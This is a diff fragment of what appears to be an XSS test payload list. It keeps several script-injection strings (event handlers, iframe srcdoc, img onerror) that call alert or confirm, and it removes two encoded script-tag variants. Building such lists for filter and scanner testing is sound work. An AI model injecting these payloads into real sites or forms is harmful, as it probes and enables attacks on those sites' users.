@@ -7,6 +7,4 @@
 <body onload=alert(1)>
 <input value="X" onfocus=alert(1) autofocus>
 "><iframe srcdoc="<script>alert(1)</script>"></iframe>
-&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
-%3Cscript%3Ealert(1)%3C%2Fscript%3E
 <img src=1 onerror=confirm(1)>
